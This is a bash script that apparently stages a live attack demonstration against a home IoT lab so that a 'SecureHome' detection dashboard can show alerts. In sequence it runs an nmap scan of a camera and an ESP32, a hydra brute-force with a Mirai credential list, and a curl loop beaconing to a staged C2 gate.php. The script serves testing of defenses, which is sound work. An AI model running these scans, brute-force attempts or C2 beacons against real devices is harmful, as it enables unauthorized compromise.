#!/usr/bin/env bash
# ===========================================================================
#  SecureHome — LIVE attack runner (run from the Kali attacker box)
#  Each step pauses so you can narrate. Ctrl-C to stop the beacon loop.
# ===========================================================================
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
set -a; source "$HERE/../config.dhruv.env"; set +a

C="\033[1;36m"; G="\033[1;32m"; Y="\033[1;33m"; R="\033[1;31m"; N="\033[0m"
pause(){ echo -e "${Y}--- press ENTER to run: $1 ---${N}"; read -r _; }
banner(){ echo -e "\n${C}==================================================${N}\n${C} $1${N}\n${C}==================================================${N}"; }

banner "PHASE 1 — RECON  (nmap)"
echo "Mapping the Tuya camera and ESP32 on ${LAN_CIDR}."
pause "nmap -sV against camera + esp32"
sudo nmap -sV -T4 -p 21,22,23,80,443,554,6668,8000,8080,8886 "$CAMERA_IP" "$ESP32_IP"
echo -e "${G}>> Dashboard should now show: RECON / port-scan alert (stage DETECT).${N}"

banner "PHASE 2 — COMPROMISE  (Mirai-pattern brute-force on ESP32)"
echo "Tuya camera is cloud-bound and exposes no login, so the brute-force"
echo "targets the ESP32's deliberately-weak ${BRUTEFORCE_SERVICE} service."
pause "hydra -C mirai_creds.txt ${BRUTEFORCE_SERVICE}://${BRUTEFORCE_TARGET}"
if [ "$BRUTEFORCE_SERVICE" = "ssh" ]; then
  hydra -C "$HERE/mirai_creds.txt" -t 4 -f "ssh://${BRUTEFORCE_TARGET}:${BRUTEFORCE_PORT}" || true
else
  hydra -C "$HERE/mirai_creds.txt" -t 4 -f "telnet://${BRUTEFORCE_TARGET}:${BRUTEFORCE_PORT}" || true
fi
echo -e "${G}>> Dashboard should now show: COMPROMISE / brute-force alert.${N}"

banner "PHASE 3 — C2 BEACON  (compromised device phones home)"
echo "The 'compromised' device beacons to the staged C2 (${STAGED_C2_IP})."
echo "1st connection is DETECTED+LOGGED; from the 2nd onward SecureHome BLOCKS it."
pause "beacon loop to ${STAGED_C2_IP}:${STAGED_C2_PORT}"
i=1
while true; do
  echo -e "${R}[beacon #$i] -> http://${STAGED_C2_IP}:${STAGED_C2_PORT}/gate.php${N}"
  curl -s -m 3 "http://${STAGED_C2_IP}:${STAGED_C2_PORT}/gate.php" >/dev/null 2>&1 \
    && echo "   reached C2 (not yet blocked)" \
    || echo -e "   ${G}connection failed — blocked by SecureHome${N}"
  i=$((i+1)); sleep 5
done
